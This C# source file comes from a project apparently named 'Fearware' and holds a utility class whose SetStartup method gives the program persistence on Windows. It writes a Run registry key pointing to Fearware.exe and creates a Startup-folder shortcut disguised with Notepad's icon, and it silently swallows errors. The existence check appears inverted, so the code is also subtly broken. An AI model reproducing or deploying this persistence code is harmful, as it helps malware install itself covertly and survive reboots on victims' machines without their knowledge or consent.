using IWshRuntimeLibrary;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Fearware
{
    public static  class FWUtility
    {

        public static string CreateFolder(string v)
        {
            if (!Directory.Exists(v))
            {
                Directory.CreateDirectory(v);
            }
            return v;
        }


        public static void SetStartup()
        {
            if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\Fearware.lnk"))
            {
                try
                {
                    RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    rk.SetValue("Fearware", Environment.CurrentDirectory + "\\Fearware.exe");
                }
                catch { }
                try
                {
                    IWshRuntimeLibrary.IWshShell_Class wsh = new IWshShell_Class();
                    IWshRuntimeLibrary.IWshShortcut shortcut = wsh.CreateShortcut(
                        Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\Fearware.lnk") as IWshRuntimeLibrary.IWshShortcut;
                    shortcut.Arguments = "";
                    shortcut.TargetPath = Environment.CurrentDirectory + "\\Fearware.exe";
                    // not sure about what this is for
                    shortcut.WindowStyle = 1;
                    shortcut.Description = "my shortcut description";
                    shortcut.WorkingDirectory = Environment.CurrentDirectory;
                    shortcut.IconLocation = "notepad.exe, 0";
                    shortcut.Save();
                }
                catch { }
            }
        }

    }
}
